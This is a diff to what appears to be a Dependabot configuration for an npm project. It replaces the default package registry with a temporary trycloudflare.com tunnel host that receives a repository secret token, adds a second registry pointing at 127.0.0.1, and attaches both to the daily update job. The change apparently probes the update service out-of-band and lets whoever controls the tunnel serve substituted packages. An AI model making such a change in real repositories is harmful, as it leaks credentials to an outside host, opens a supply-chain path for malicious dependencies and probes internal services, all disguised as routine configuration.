@@ -1,11 +1,16 @@
 version: 2
 registries:
-  sink1tunnel:
+  oob:
     type: npm-registry
     url: https://rand-terms-bytes-subsidiaries.trycloudflare.com/
     token: ${{secrets.SINK1_TOKEN}}
+    replaces-base: true
+  internal:
+    type: npm-registry
+    url: https://127.0.0.1:80/
     replaces-base: true
 updates:
   - package-ecosystem: "npm"
     directory: "/"
     schedule: {interval: "daily"}
+    registries: [oob, internal]
